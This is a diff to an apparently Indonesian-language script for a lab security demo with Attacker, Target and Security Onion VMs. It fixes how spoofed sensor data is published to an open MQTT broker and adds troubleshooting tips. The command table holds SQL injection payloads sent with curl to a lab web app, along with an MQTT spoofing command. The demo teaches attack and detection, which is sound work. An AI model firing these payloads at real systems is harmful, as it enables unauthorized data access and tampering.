@@ -327,9 +327,11 @@ Biarkan terbuka.
 
 **Terminal kedua, di VM Attacker:**
 
-`mosquitto_pub -h 192.168.5.5 -t sensors/sensor-99 -m "99.90,0.00"`
+`mosquitto_pub -h 192.168.5.5 -t sensors/sensor-99 -m 99.90`
 
 Yang diucapkan: "Tidak ada kata sandi, tidak ada penolakan. Broker menerima siapa saja."
+
+Catatan penting: subscriber hanya menerima angka polos atau JSON dengan kunci `suhu` dan `kelembapan`. Format berkoma seperti `99.90,0.00` akan ditolak dan muncul di log sebagai `dilewati, payload bukan angka atau JSON`. Jadi pakai angka polos, sekaligus bebas dari masalah tanda kutip.
 
 **Di VM Target,** tunjukkan baris masuk:
 
@@ -496,6 +498,8 @@ Harus muncul `menunggu pesan di sensors/#`.
 6. Menghapus data butuh akun root. `app_iot` tidak punya hak DELETE dan akan menghasilkan `ERROR 1142`.
 7. Kibana memakai UTC, catatan tim memakai WIB, selisih tujuh jam. Jangan mengira itu sesi berbeda.
 8. Menuliskan perintah dengan tanda kutip lewat chat berisiko terpotong saat disalin. Ketik SQL langsung di prompt mysql.
+9. Subscriber menolak payload berkoma. `99.90,0.00` masuk log sebagai `dilewati, payload bukan angka atau JSON`. Pakai angka polos `99.90` atau JSON `{"suhu": 99.90, "kelembapan": 0}`.
+10. `killall -f` tidak dikenal di image Target, dan `killall app.py` tidak menemukan apa pun karena nama prosesnya `python3`. Matikan pakai `sudo kill <PID>` dari hasil `ps -eo pid,cmd | grep app.py`.
 
 ---
 
@@ -532,7 +536,7 @@ Semua perintah yang dipakai demo, dikelompokkan per mesin. Buka bagian ini kalau
 | payload OR | `curl "http://192.168.5.5:3000/sensor?device=x%27%20OR%20%271%27%3D%271"` |
 | payload AND | `curl "http://192.168.5.5:3000/sensor?device=x%27%20AND%20%271%27%3D%272"` |
 | pantau MQTT | `mosquitto_sub -h 192.168.5.5 -t 'sensors/#' -v` |
-| kirim data palsu | `mosquitto_pub -h 192.168.5.5 -t sensors/sensor-99 -m "99.90,0.00"` |
+| kirim data palsu | `mosquitto_pub -h 192.168.5.5 -t sensors/sensor-99 -m 99.90` |
 | buka dashboard | browser ke `http://192.168.5.5:3000` |
 
 ## Di VM Onion
